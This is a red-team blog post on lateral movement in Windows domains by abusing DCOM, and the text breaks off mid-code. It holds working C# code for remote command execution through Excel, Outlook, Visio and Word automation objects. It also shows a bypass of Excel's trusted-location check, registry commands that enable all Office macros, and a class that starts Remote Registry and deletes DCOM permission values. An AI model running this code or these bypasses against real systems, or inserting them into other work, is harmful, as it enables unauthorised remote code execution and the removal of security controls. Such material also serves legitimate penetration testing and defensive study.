---
title: "Active Directory: Lateral Movement via DCOM"
date: 2020-06-13 12:30:00 +0100
categories: [Active Directory, Lateral Movement]
tags: [ad, pentesting, red-teaming, lateral-movement, dcom]     # TAG names should always be lowercase
---

## TL;DR

The term "Lateral movement" refers to the the set of techniques that allows an attacker to acquire further access into a network, after gaining initial access. The attacker, after gaining access to the network, maintains ongoing access by moving through the compromised environment and obtaining increased privileges using various tools.

## Introduction

Often, during a red team engagement or internal penetration test, a tester requires to move laterally in the compromised domain, to extend his access and permissions up to the designated target.

 >Lateral movement is the process of moving from one compromised host to another. 

Usually, lateral movement includes three main steps:
* Internal Reconnaissance
* Privilege Escalation and dumping of Credentials Hashes and Kerberos Tickets
* Gain access on a remote (lateral) target
 
In the following document are presented a few among the methods commonly used to accomplish this, and a set of C# tools created to ease this process.
You can access the tools directly at this [URL](https://github.com/klezVirus/CheeseTools).

# Lateral Movement Using DCOM Objects and C#

## TL;DR

This post is a description of a brief study of DCOM technology, and how to abuse that for lateral movement purposes. This post is mostly based on the amazing work of Matt Nelson [enigma0x3](https://twitter.com/enigma0x3) and Philip Tsukerman [@PhilipTsukerman](https://twitter.com/PhilipTsukerman), and presents an implementation of their work in C#, highlighting a few grey point left in Philip paper, [New lateral movement techniques abuse DCOM technology](https://www.cybereason.com/blog/dcom-lateral-movement-techniques). 

## Introduction

Often, during a red team engagement or internal penetration test, a tester requires to move laterally in the compromised domain, to extend his access and permissions up to the designated target.

 >Lateral movement is the process of moving from one compromised host to another. 

Among the methods used to accomplish this, the most easy and commonly used (at least in the past) wass surely PowerShell Remoting, but there are other pretty interesting methods used nowadays to achieve the same result. 

The method explained in this post is lateral movement abusing DCOM technology.

## COM Layer

COM, or Component Object Model, is an old technology introduced by Microsoft around 1995, which provides a user-mode framework which allows to develop reusable object-oriented components using programming languages.

Nowadays, the term COM is used to describe different related technologies, as:

* The COM model itself
* The inter-process communication protocol and registration that allows components inter-communication, which allows clients to interact with COM object hosted on remote servers
* The protocol specifications built on top of the COM object model to enable hosts to communicate with objects written in multiple languages, shuch as OLE Automation and ActiveX technologies

## DCOM

DCOM is an extension of COM, which allows applications to communicate with and use COM objects on a remote computer as they were local, using the DCERPC-based DCOM protocol. The distinction between COM and Distributed COM (DCOM, or COM across machines) is often only theoretical, and most of the internal building blocks are shared between the two technologies.

Information about every COM object, (identity, implementation and configuration) is stored in the registry, and associated with the following important identifiers, stored as GUID:

* CLSID - The Class Identifier is a unique identifier for a COM class, and every class registered in Windows is associated with a CLSID. The CLSID key in the registry points to the implementation of the class, using the InProcServer32 subkey in case of a dll-based object, and the LocalServer32 key in case of an exe.
* ProgID - The Programmatic Identifier is an optional identifier, that gives a human readable, friendly name to a COM object, which can be used on behalf of a CLSID when requesting a COM object. 
* AppID  - The Application Identifier is used to specify the configuration of one or more COM objects associated with the same executable. This includes the permissions given to various groups to instantiate and access the associated classes, both locally and remotely

To make a COM object accessible by DCOM, an AppID must be associated with the CLSID of the class and appropriate permissions need to be given to the AppID. A COM object without an associated AppID cannot be directly accessed from a remote machine.

Following Microsoft Documentation, the whole set of COM AppIDs can be found under `HKLM\SOFTWARE\Classes`, which correspond to keys stored under `HKEY_CLASSES_ROOT\AppID`, while the COM CLSIDs can be found under `HKCR\CLSID`.

When converting from a ProgID to a an AppID, the system goes through the following chain:

* Lookup ProgID among `HKEY_LOCAL_MACHINE\SOFTWARE\Classes`
* Lookup CLSID among `HKEY_CLASSES_ROOT\CLSID`
* Lookup AppID among `HKEY_CLASSES_ROOT\AppID`

So in case of ProgID = Excel.Application

``` 
> reg query HKLM\SOFTWARE\Classes\Excel.Application\CLSID

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Excel.Application\CLSID
    (Default)    REG_SZ    {00024500-0000-0000-C000-000000000046}

> reg query "HKCR\CLSID\{00024500-0000-0000-C000-000000000046}"

HKEY_CLASSES_ROOT\CLSID\{00024500-0000-0000-C000-000000000046}
    (Predefinito)    REG_SZ    Microsoft Excel Application
    AppID    REG_SZ    {00020812-0000-0000-C000-000000000046}

> reg query "HKCR\AppID\{00020812-0000-0000-C000-000000000046}"

HKEY_CLASSES_ROOT\AppID\{00020812-0000-0000-C000-000000000046}
    (Predefinito)    REG_SZ    Microsoft Excel Application
```

### DCOM Objects Permissions

DCOM objects are associated with a set of security configuration. In the scope of this article, the most important are:

* Global Access Permissions
    - Access permissions
    - Launch and activation permissions
* Application Wide Permissions
    - Access permissions
    - Launch and activation permissions
    
These permissions can be easily found in the registry in the form of Binary Values:

```powershell
> reg query "HKCR\AppID\{00020812-0000-0000-C000-000000000046}"

HKEY_CLASSES_ROOT\AppID\{00020812-0000-0000-C000-000000000046}
    (Predefinito)    REG_SZ    Microsoft Excel Application
    AccessPermission    REG_BINARY    010004805C0000006C00000000000000140000000200480003000000010018000700000001020000000000052000000020020000000014000700000001010000000000050A00000000001400030000000101000000000005120000000102000000000005200000002002000001020000000000052000000020020000
    LaunchPermission    REG_BINARY    010004805C0000006C00000000000000140000000200480003000000010018001F00000001020000000000052000000020020000000014001F000000010100000000000512000000000014001F0000000101000000000005040000000102000000000005200000002002000001020000000000052000000020020000
```

The binary values are raw security descriptors (SD) in binary form. In order to get the permissions of a user, the DACL for the user should be parsed from the SD, and checked against the user issuing the DCOM access/execution request.

## DCOM object instantiation 

A DCOM object can be invoked remotely following the below steps:

* The remote client sends a request to instantiate an object. If the request is issued against a ProgID, it is first resolved locally to a CLSID.
* The "server" will then execute a chain of checks, to ensure the request is valid and issued against an existing DCOM object. More specifically:  
    - Verify that an AppID to CLSID associations exists
    - Verify that the client is authorised to access the requested object 
* The DCOMLaunch service creates an instance of the requested class, establishes a communication channel with the client application. The client is then able to access DCOM object.

## Abuse

As explained, DCOM objects can be invoked and used remotely, and under certain conditions, they allows to execute arbitrary code on the target machine. 

### Overview

In the amazing research of Matt Nelson, the following objects were found to be useful for executing arbitrary code:

1. ShellWindows
2. ShellBrowserWindows
3. MMC20.Application

These three objects share a very nice characteristic, their permissions cannot be altered on a per application basis by default.
That means that the only way to deny access to them is disabling DCOM access globally or implement a firewall-based protection.

After that, Philip Tsukerman published a new research, focused on Office Automation objects. The research shows how, abusing that feature, it is possible to execute arbitrary code as well.
The DCOM objects->functions that can be abused for this purpose were:

4. Excel.Application
    1. DDEInitiate
    2. RegisterXLL
5. Outlook.Application
    1. CreateObject->Shell.Application
    2. CreateObject->ScriptControl (office-32bit only)
6. Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)
    1. Addons
    2. ExecuteLine
7. Word.Application
    1. RunAutoMacro

### C# "Exploitation"

A C# implementation of the methods 1 to 4.1 has already been presented and implemented within both [SharpDCOM](https://github.com/rvrsh3ll/SharpCOM) by [rvrsh3ll](https://twitter.com/424f424f) and [CsDCOM](https://github.com/rasta-mouse/MiscTools/tree/master/CsDCOM) by [rasta_mouse](https://twitter.com/_rastamouse), and repeating the obvious is not the author intention, however, it's necessary to explain how DCOM objects are called using C#. In order to do that, it's good to see the implementation of ExcelDDE:<br>

```cs
static void ExcelDDE(string target, string binary, string arg)
{
    try
    {
        // PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        // PS> $excel.DisplayAlerts =$false
        obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
        // PS> $excel.DDEInitiate($binary, $args)
        obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj, new object[] { binary, arg });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

_The above code has been taken from CsDCOM_ (comments added).
 
For completeness, you may want to check out the main project file, [here](https://github.com/rasta-mouse/MiscTools/blob/master/CsDCOM/Program.cs)

However, the tools presented lacks support for methods 4.2 to 7.1. 

#### RegisterXLL

RegisterXLL was certainly the most interesting functions to leverage, as following the research of Philip Tsukerman, the following payload should have worked:

```powershell
PS> pwd

Path
----
C:\Windows\TEMP
PS> ls .\EvilXLL.dll


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       23/06/2020     13:42          10240 EvilXLL.dll
PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS> $excel.RegisterXLL("EvilXLL.dll")
-2146826259
```

Nothing happened, the negative value is relatively near to Int32.MinValue (-2147483648), but it's unsure what that means, but the result is clear, something is failing.

Digging a bit further, it was pretty easy to discover that Excel doesn't allow to register XLL from an untrusted path. The trusted path is usually the root directory of Excel, under Program Files, so inaccessible to normal users. 

##### Bypass Path Restrictions

The question at this point was: is that possible to bypass this restriction and load an arbitrary dll?

It is known that being an admin user, it may be possible to change/add registry keys, thus allowing the attacker to enable custom locations, or to enable network shares, via 
```
reg add HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1
``` 
but what if that is not possible?

To accomplish this objective, the first step was to discover which paths were marked as trusted:

```powershell
PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations"

HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location0
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location1
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location2
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location3
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location4
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location5

PS >for ($i=0;$i -lt 5;$i++){ reg query "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location$i" | Select-String Path }

    Path    REG_SZ    C:\Program Files\Microsoft Office\Root\Office16\XLSTART\
    Path    REG_EXPAND_SZ    %APPDATA%\Microsoft\Excel\XLSTART
    Path    REG_EXPAND_SZ    %APPDATA%\Microsoft\Templates
    Path    REG_SZ    C:\Program Files\Microsoft Office\Root\Templates\
    Path    REG_SZ    C:\Program Files\Microsoft Office\Root\Office16\STARTUP\

```

The value %APPDATA% seemed very promising. On Windows system, the appdata value is set by default to `C:\Users\{username}\AppData\Roaming`. As any user can access its own AppData folder, simply moving the XLL under `C:\Users\{username}\AppData\Roaming\Microsoft\Excel\XLSTART` and load it, would be enough to bypass the path restriction. 

In the context of Lateral Movement, that would be perfectly fine as long as we could compromise a user on the remote system. Once executed, the following C# code would try to move the evil XLL under the correct path, before loading it:

```cs
public static void ExcelXLL(string target, string user, string binary, string args=null)
{
    if (!user || user == "")
    {
        Console.WriteLine(" [x] Invalid username");
        return;
    }
    if (!File.Exists(binary))
    {
        Console.WriteLine(" [x] XLL not found");
        return;
    }

    string absPath = Path.GetFullPath(binary);
    string path = Path.GetDirectoryName(absPath);
    string fakePath = $"C:\\Users\\{user}\\AppData\\Microsoft\\Excel\\XLSTART";
    string filePath = binary;
    string fakeFilePath = Path.Combine(fakePath, Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".xll");

    if (!Validator.IsValidXLLPath(path))
    {
        Console.WriteLine(" [x] WARNING: Loading XLL from untrusted location is disabled by default");
        path = fakePath;
    }

    var macro = $"DIRECTORY(\"{path}\")";

    try
    {
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        obj.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, obj,
            new object[] { macro });

        if (!Validator.IsValidXLLPath(path))
        {
            Console.WriteLine(" [-] WARNING: Trying to move XLL into AppData to bypass untrusted location check");
            Console.WriteLine($" [+] INFO: Old File Location {absPath}");
            Console.WriteLine($" [+] INFO: New AppData {path}");
            if (!Directory.Exists(fakePath))
            {
                DirectoryInfo di = Directory.CreateDirectory(fakePath);
            }
            Console.WriteLine(" [+] Moving XLL file");
            File.Copy(filePath, fakeFilePath);
        }

        Exception regXLLex = null;
        try
        {
            obj.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, obj,
                new object[] { fakeFilePath });
            var exe = Activator.CreateInstance(type);
        }
        catch (Exception e)
        {
            regXLLex = e;
        }
        // Cleaning Up
        if (File.Exists(fakePath))
        {
            File.Delete(fakePath);
        }

        // An exception was raised before, re-raising it
        if (regXLLex != null)
        {
            Console.WriteLine($" [x] ERROR: RegisterXLL threw {regXLLex.Message}");
        }

    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

However, in the context of local execution, it's possible to go a step further. As the user has access to its own variables as well, it's very easy to tamper the AppData value as well, just before the call to RegisterXLL. This would allow to load custom XLL from arbitrary locations (!!! **this includes drive-mapped network shares** !!!). 

The process to operate this bypass is simple:

1. Change AppData to a user controlled directory (e.g. `C:\Windows\Temp`)
2. Create the path %AppData%\Microsoft\Templates (`C:\Windows\Temp\Microsoft\Templates`)
3. Move the XLL into the folder (`C:\Windows\Temp\Microsoft\Templates\EvilAddIn.xll`)
4. Call RegisterDLL on the XLL file

The following C# code would do exactly that:

```cs
public static void ExcelXLL(string target, string binary, string args = null)
{
    if (!File.Exists(binary))
    {
        Console.WriteLine(" [x] XLL not found");
        return;
    }

    string absPath = Path.GetFullPath(binary);
    string path = Path.GetDirectoryName(absPath);
    string fakePath = Path.Combine(path, "Microsoft\\Excel\\XLSTART");
    string filePath = binary;
    string fakeFilePath = Path.Combine(fakePath, Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".xll");

    if (target != Environment.MachineName)
    {
        Console.WriteLine(" [x] NOT IMPLEMENTED: This method cannot be used remotely");
        Environment.Exit(1);
    }
    AppData appData = AppData.CreateInstance();

    if (!Validator.IsValidXLLPath(path))
    {
        Console.WriteLine(" [x] WARNING: Loading XLL from untrusted location is disabled by default");
    }

    var macro = $"DIRECTORY(\"{path}\")";

    try
    {
        Exception regXLLex = null;
        var type = Type.GetTypeFromProgID("Excel.Application", target);
        var obj = Activator.CreateInstance(type);
        obj.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, obj,
            new object[] { macro });

        if (!Validator.IsValidXLLPath(path))
        {
            Console.WriteLine(" [-] WARNING: Trying to modify AppData to bypass untrusted location check");
            Console.WriteLine($" [+] INFO: Old AppData {appData.GetCurrent()}");
            appData.Change(path);
            Console.WriteLine($" [+] INFO: New AppData {appData.GetCurrent()}");
            Console.WriteLine($" [+] Generating Fake Path: {fakePath}");
            try
            {
                if (!Directory.Exists(fakePath))
                {
                    DirectoryInfo di = Directory.CreateDirectory(fakePath);
                }

                Console.WriteLine(" [+] Moving XLL file");
                File.Copy(filePath, fakeFilePath);

            }
            catch(Exception e)
            {
                regXLLex = e;
            }
        }

        try
        {
            obj.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, obj,
                new object[] { fakeFilePath });
            var exe = Activator.CreateInstance(type);
        }
        catch (Exception e)
        {
            regXLLex = e;
        }
        // Restoring AppData
        if (appData.ChangeApplied())
        {
            Console.WriteLine(" [+] Restoring AppData");
            appData.Restore();
        }
        // Cleaning Up
        if (File.Exists(fakePath))
        {
            File.Delete(fakePath);
        }

        // An exception was raised before, re-raising it
        if (regXLLex != null)
        {
            Console.WriteLine($" [x] ERROR: RegisterXLL threw {regXLLex.Message}");
        }

    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

To finish, a few key notes on loading from network shares:

    - The network share should exist and be mapped to a drive already
    - You must be an Admin to enable a share on the machine
    - In AD context, you might not be able to use a a network share mapped via IP, so you may need to compromised a machine joined to the domain to do that

#### Outlook ShellExecute

Another interesting method, is Outlook's `CreateObject`. This method allows Outlook to create instances of other DCOM objects. Taking into consideration that certain COM objects allows to execute arbitrary code pretty easily, it's very easy to spot why that's an issue. Briefly, it is possible to: 

* create a `Shell.Application` COM object using `CreateObject` 
* execute commands with it using `ShellExecute`

```cs
public static void OutlookShellEx(string target, string binary, string arg)
{
    try
    {
        var type = Type.GetTypeFromProgID("Outlook.Application", target);
        var obj = Activator.CreateInstance(type);

        var shell = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
            new object[] { "Shell.Application" });
        shell.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, shell,
            new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

Of course, the `Shell.Application` COM object is not the only one that could give an attacker code execution capabilities. `ScriptControl` is another object that can be abused to execute arbitrary code via Office Macros.

```cs
public static void OutlookScriptEx(string target, string binary, string arg)
{
    try
    {
        var type = Type.GetTypeFromProgID("Outlook.Application", target);
        var obj = Activator.CreateInstance(type);

        try
        {
            var scriptControl = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
                new object[] { "ScriptControl" });
            scriptControl.GetType().InvokeMember("Language", BindingFlags.SetProperty, null, scriptControl,
                new object[] { "VBScript" });
            var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
            scriptControl.GetType().InvokeMember("AddCode", BindingFlags.InvokeMethod, null, scriptControl,
                new object[] { code });
        }
        catch
        {
            Console.WriteLine(" [-] FATAL ERROR: Unable to load ScriptControl on a 64-bit Outlook");
            Environment.Exit(1);
        }
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

Visio, although not used as other Office applications, serves two interesting methods to execute arbitrary code. The first one, `ExecLine`, can execute arbitrary code from a string.

Although a single line of PowerShell is often more than enough to achieve nice results, the research warns that `ExecLine` can execute just a line of code. In case it's strictly necessary to split the code in multiple lines, they must be divided using ":". 


```cs
public static void VisioExecLine(string target, string binary, string arg)
{
    var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
    try
    {
        var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
        if (type == null)
        {
            Console.WriteLine(" [x] Visio not installed");
            return;
        }

        var obj = Activator.CreateInstance(type);

        var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
        var doc = docs.GetType().InvokeMember(@"Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
        doc.GetType().InvokeMember(@"ExecuteLine", BindingFlags.InvokeMethod, null, doc, new object[] { code });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

Visio offers another nice way to execute arbitrary code, via the the `Addon` property. If the reader had any chance read the original paper (by Philip Tsukerman), she might have been puzzled in seeing the following:

<img style="border: 5px solid #555;" src="imgs/blog/002LateralMovement/tsuker.png"/>

The image was clear mistaken, but the post is so accurate than reconstructing the chain was trivial:

```powershell
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", $target))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")
```

Translated in C#, it would appear like the following:

```cs
public static void VisioAddonEx(string target, string binary, string arg)
{
    try
    {
        var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
        if (type == null)
        {
            Console.WriteLine(" [x] Visio not installed");
            return;
        }

        var obj = Activator.CreateInstance(type);
        var addons = obj.GetType().InvokeMember("Addons", BindingFlags.GetProperty, null, obj, null);
        var addon = addons.GetType()
            .InvokeMember(@"Add", BindingFlags.InvokeMethod, null, addons, new object[] { binary });
        // Executing Addon
        addon.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, null, addon, new object[] { arg });
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

### 

Last but not least, it is possible to execute arbitrary object directly executing VBA project into almost any office COM automation object (Excel, Word, PowerPoint, Access).

Word was chosen for the PoC code, as surely is the most widely used, and because Excel had already been covered by other, more reliable, methods.

That doesn't mean the following method is not reliable, but presents a major drawback. Indeed, in order to use this method, two settings in Word must be enabled in the context of the targeted user:

* Enable all macros (not recommended; potentially dangerous code can run)
* Trust access to the VBA project object model

The two options can be enabled via GUI, under Options->Trust Center->Macro Settings, or via Windows Registry, using the following commands:

```
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v VBAWarnings /t REG_DWORD /d 1
reg add "HKCU\Software\Microsoft\Office\16.0\Word\Security" /v AccessVBOM /t REG_DWORD /d 1
```

**Note:** 16.0 is for version >=2016.


```cs
public static void OfficeMacro(string target, string binary, string arg)
{
    Console.WriteLine($"[*] Setting up Word Office Macro");
    try
    {
        var type = Type.GetTypeFromProgID("Word.Application", target);
        var code = $"{binary} {arg}";
        var macro = $@"Sub Execute()
Dim wsh As Object
Set wsh = CreateObject(""WScript.Shell"")
wsh.Run ""{code}""
Set wsh = Nothing
End Sub
Sub AutoOpen()
Execute
End Sub
";
        var obj = Activator.CreateInstance(type);

        var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
        foreach (var m in docs.GetType().GetProperties())
            if (m.Name == "Documents")
            {
                Console.WriteLine($" [+] Fetched: {m}");
                docs = m.GetValue(docs);
            }

        var doc = docs.GetType().InvokeMember("Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
        // For some reason vbProject won't be initialized correctly with the following statement
        var vbProject = doc.GetType().InvokeMember("VBProject", BindingFlags.GetProperty, null, doc, null);
        Console.WriteLine(" [+] Setting up VBProject");

        foreach (var m in doc.GetType().GetProperties())
            if (m.Name == "VBProject")
            {
                Console.WriteLine($" [+] Fetched: {m}");
                vbProject = m.GetValue(doc);
            }

        var vbComponents = vbProject.GetType()
            .InvokeMember("VBComponents", BindingFlags.GetProperty, null, vbProject, null);
        var vbc = vbComponents.GetType()
            .InvokeMember("Add", BindingFlags.InvokeMethod, null, vbComponents, new object[] { 1 });

        Console.WriteLine(" [+] Loading Macro");

        var codeModule = vbc.GetType().InvokeMember("CodeModule", BindingFlags.GetProperty, null, vbc, null);
        codeModule.GetType().InvokeMember("AddFromString", BindingFlags.InvokeMethod, null, codeModule,
            new object[] { macro });
        // Run Macro
        doc.GetType().InvokeMember("RunAutoMacro", BindingFlags.InvokeMethod, null, doc, new object[] { 2 });
        // Shutdown Word
        obj.GetType().InvokeMember("Quit", BindingFlags.InvokeMethod, null, obj, null);
    }
    catch (Exception e)
    {
        Console.WriteLine(" [x] {0}", e.Message);
    }
}
```

### Protection

A usual suggestion by security experts to disable access to office COM objects. This can be easily done using the Microsoft **dcomcnfg.exe** utility. The advice is more than correct, but, depending on different situations/configurations, it may be not enough.

#### Bypass Application-Based permissions

Application based permissions are always stored under HKCR\AppID\{ApplicationAppID}, with values:

* AccessPermission
* LaunchPermission

Normally, when no permissions are set against an application, this value simply don't exist in the registry, allowing anyone to access them. That means that deleting those registry values, all the permissions will be reset!

Even if very effective, the above approach has two major drawbacks:

* Requires Admin access
* If against a remote target, Remote Registry Service must be enable on the remote machine.

#### Bypass Global permissions

Global based permissions are set in `HKLM\SOFTWARE\Microsoft\Ole`:

```
reg query "HKLM\SOFTWARE\Microsoft\Ole"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole
    DefaultLaunchPermission     REG_BINARY    {snipped}
    EnableDCOM                  REG_SZ        Y
    LegacyImpersonationLevel    REG_DWORD     0x2
    MachineAccessRestriction    REG_BINARY    {snipped}
    MachineLaunchRestriction    REG_BINARY    {snipped}
```

As the mechanism used to store access permission is the same used for Application Level Permissions, it might be legit to think that the same trick is usable. However, global DCOM permissions are always set by default, and changing them arbitrarily might be unsafe. To avoid this issue, it was tried to tamper the binary security descriptor associated with 

However, all the attempts tried showed that is not easy to change these kind of permissions remotely, even having administrator access.

The following C# code has been designed to access the registry, locate the COM Object AppIDs in a "noisy" way, (using sequential search instead of direct access), delete the permissions associated with the COM objects, and global permissions. The code had been tested locally and remotely, but showed to be fully working only if executed locally, by an Administrator in High Integrity mode.

```cs
static class ComACLRights
{
    public const int COM_RIGHTS_EXECUTE = 1;
    public const int COM_RIGHTS_EXECUTE_LOCAL = 2;
    public const int COM_RIGHTS_EXECUTE_REMOTE = 4;
    public const int COM_RIGHTS_ACTIVATE_LOCAL = 8;
    public const int COM_RIGHTS_ACTIVATE_REMOTE = 16;
}
class DCOMcfg
{
    private const string ClassIDKeyPath = "CLSID";//"AppID";
    private const string AppIDKeyPath = "AppID";
    private const string OleKeyPath = "SOFTWARE\\Microsoft\\Ole";

    private string target;
    private bool isRemote;
    private bool debug;
    private string[] applications;

    private RegistryKey classesRootKey;
    private RegistryKey localMachineKey;

    public DCOMcfg(string target=null)
    {
        this.debug = false;
        this.isRemote = false;
        this.target = Environment.MachineName;
        if (target != Environment.MachineName && !String.IsNullOrEmpty(target))
        {
            this.target = String.Format("{0}{1}", "\\\\", target);
            this.isRemote = true;
        }
        this.applications = new[]
            {"MMC20.Application","Excel.Application","Visio.Application" , "Visio.InvisibleApp", "Outlook.Application", "Word.Application"};

        if (this.isRemote)
        {
            this.classesRootKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.ClassesRoot, this.target, RegistryView.Default);
            this.localMachineKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, this.target, RegistryView.Default);
        }
        else
        {
            /*
            if (Environment.Is64BitOperatingSystem)
                this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32);
            else
                this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32);
            */
            this.classesRootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Default);
            this.localMachineKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default);
        }

    }

    public string getTarget()
    {
        return this.target;
    }

    public bool EnsureRemoteRegistryRunning()
    {
        bool result = false;
        try
        {
            System.ServiceProcess.ServiceController sc = new ServiceController("RemoteRegistry", this.target);
            if (sc.Status.Equals(ServiceControllerStatus.Stopped)){
                if (sc.StartType == ServiceStartMode.Disabled)
                {
                     ServiceHelper.ChangeStartMode(sc, ServiceStartMode.Automatic);
                }
                sc.Start();
                Thread.Sleep(2000);
                result = sc.Status.Equals(ServiceControllerStatus.Running);
            }
            else
            {  
                result = true;
            }
        } catch
        {
            // it is stopped
            result = false;
        }

        return result;
    }

    static string DictToTable(Dictionary<string, bool> dictionary)
    {
        string dictionaryString = "";
        foreach (KeyValuePair<string, bool> keyValues in dictionary)
        {
            dictionaryString += (keyValues.Value ? " [+] SUCCESS:" : " [-] FAILED:");
            dictionaryString += $" {keyValues.Key}{Environment.NewLine}";
        }
        return dictionaryString;
    }

    private List<string> AppNamesToClsIds()
    {
        Guid testGuid = Guid.NewGuid();
        List<string> appIDs = new List<string>();
     
        foreach (string app in this.applications)
        {
            string appID = "";
            try
            {
                using (var key = this.classesRootKey.OpenSubKey(Path.Combine(app, "CLSID")))
                {
                    // Get Default Value
                    string appClsId = key?.GetValue("") as string;
                   
                    if (Guid.TryParse(appClsId, out testGuid))
                    {
                        using (var subKey = this.classesRootKey.OpenSubKey(Path.Combine(ClassIDKeyPath, appClsId)))
                        {
                            appID = subKey?.GetValue("AppID") as string;
                            if (!Guid.TryParse(appID, out testGuid))
                            {
                                throw new Exception($"Invalid AppID: {app}");
                            }
                            appIDs.Add(appID);
                        }
                    }
                    else
                    {
                        throw new Exception($"Invalid CLSID: {app}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($" [x] WARNING: Catch exception {e.Message}");
                continue;
            }
        }

        return appIDs;
    }

    private Dictionary<string, bool> DeleteAppPermissions(List<string> appIDs)
    {
        List<string> permissionKeys = new List<string>(){ @"AuthenticationLevel", @"LaunchPermission", @"AccessPermission" };
        Dictionary<string, bool> results = new Dictionary<string, bool>();
        

        foreach (string appID in appIDs)
        {
            try
            {
                bool res = true;
                using (RegistryKey key =
                    this.classesRootKey.OpenSubKey(Path.Combine(AppIDKeyPath, appID), true))
                {
                    foreach (string subKeyName in permissionKeys)
                    {
                        try
                        {
                            /*RegistrySecurity rs = new RegistrySecurity();
                            rs.AddAccessRule(new RegistryAccessRule("Everyone",
                                RegistryRights.WriteKey,
                                InheritanceFlags.None,
                                PropagationFlags.None,
                                AccessControlType.Allow));
                            key.SetAccessControl(rs);
                            */
                            key.DeleteValue(subKeyName.ToUpperInvariant());
                            res = res || true;
                        }
                        catch (Exception e)
                        {
                            if (this.debug)
                            {
                                Console.WriteLine($"[-] Failed: {e.Message}");
                            }

                            res = res || false;
                            continue;
                        }
                    }
                }

                results[appID] = res;
            }
            catch (SecurityException se)
            {
                Console.WriteLine($"[-] {se.Message}");
            }
            catch (Exception e)
            {
                if (this.debug)
                {
                    Console.WriteLine($"[-] Failed: {e.Message}");
                }

                results[appID] = false;
            }

        }
        return results;
    }

    public void EnsureDCOMPermission()
    {
        if(this.isRemote){
            Console.WriteLine("[*] Ensuring Remote Registry Access");
            EnsureRemoteRegistryRunning();
        }
        Console.WriteLine("[*] Converting application names to CLS IDs");
        // Add named applications CLSIDs
        List<string> clsIDs = this.AppNamesToClsIds();
        // Add ShellBrowser and Shell
        clsIDs.Add("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}");
        clsIDs.Add("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}");

        Console.WriteLine("[+] Enabling Global Ole permissions");
        try
        {
            this.EnsureGlobalPermissions();
        }
        catch(Exception e)
        {
            Console.WriteLine($" [x] Could not access Global Ole permissions: {e.Message}");
        }

        Console.WriteLine("[+] Deleting troublesome app permissions");
        // Deleting permissions
        Dictionary<string, bool> results = DeleteAppPermissions(clsIDs);

